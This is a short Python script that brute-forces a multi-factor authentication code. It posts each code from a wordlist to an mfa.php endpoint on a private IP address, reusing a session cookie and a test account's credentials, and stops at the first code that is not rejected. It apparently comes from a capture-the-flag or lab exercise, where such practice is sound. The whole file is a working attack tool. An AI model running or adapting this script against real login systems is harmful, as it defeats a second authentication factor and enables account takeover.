#!/usr/bin/python3

import requests

url = "http://10.10.213.69/console/mfa.php"

number_list = open("numbers", "r").readlines()

cookie = {
"PHPSESSID": "79btibu2jj2skg2pufr9vkpibv",
"user": "jason_test_account",
"pwd": "zzle"
}

headers = {
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate, br",
"Content-Type": "application/x-www-form-urlencoded",
"Content-Length": "9"
}

for i in number_list:
        MFA = i.strip()

        data = {
        "code" : MFA
                }

        r = requests.post(url, data=data, headers=headers, cookies=cookie)
        response = r.text

        if not "Incorrect code" in response:
                print(f"Found the code!: {MFA}")
                break
        else:
                pass
